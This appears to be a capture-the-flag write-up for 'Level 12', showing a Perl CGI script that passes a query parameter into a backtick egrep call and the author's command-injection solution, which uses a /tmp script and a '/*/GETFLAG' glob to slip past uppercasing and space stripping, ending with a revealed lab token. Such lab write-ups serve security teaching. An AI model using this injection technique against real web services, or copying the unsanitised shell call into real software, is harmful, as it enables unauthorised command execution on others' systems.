## LEVEL 12

---

This level is similar to the previous level except that now the server is `.pl` file.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

I can see a shell command executed so I can use a command injection to run `getflag`.

The only problem of this level is those two lines :
```
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

Because before to execute the command, the perl program removes every spaces from the variable and changes every lowercases to uppercases.

So I cannot just write : ```curl 'localhost:4646?x=`getflag > > /tmp/flag`&y=empty'```. Instead I must create a shell script then run it inside the perl executable.

```shell
$ vi /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag
$ export PATH=/tmp:$PATH
$ curl 'localhost:4646?x=`GETFLAG`&y=empty'
$ cat /tmp/flag
cat: /tmp/flag: No such file or directory
```

This does not work because the env variable has been set only for me not for the server.

```shell
$ vi /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag
$ curl 'localhost:4646?x=`/*/GETFLAG`&y=empty'
$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
